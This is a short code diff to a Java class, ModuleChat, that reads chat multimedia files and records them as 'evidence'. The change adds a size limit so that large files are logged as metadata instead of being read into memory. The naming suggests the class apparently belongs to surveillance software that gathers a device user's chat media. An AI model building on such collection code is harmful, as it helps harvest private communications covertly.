@@ -107,10 +107,16 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 						+ " : " +mm.file.getAbsolutePath());
 			}
 			try {
-				InputStream bio = new FileInputStream(mm.file);
-				byte[] blob = new byte[mm.size];
-				bio.read(blob);
-				EvidenceBuilder.atomic(EvidenceType.CHATMM,mm.getAdditionalData(),blob);
+				if (MessageChatMultimedia.SIZE_LIMIT >= mm.size) {
+					InputStream bio = new FileInputStream(mm.file);
+					byte[] blob = new byte[mm.size];
+					bio.read(blob);
+					EvidenceBuilder.atomic(EvidenceType.CHATMM,mm.getAdditionalData(),blob);
+				}else{
+					mm.getAdditionalData();
+					EvidenceBuilder.atomic(EvidenceType.CHATMM,mm.items);
+				}
+
 			} catch (Exception e) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (saveEvidenceMultimedia):",e);
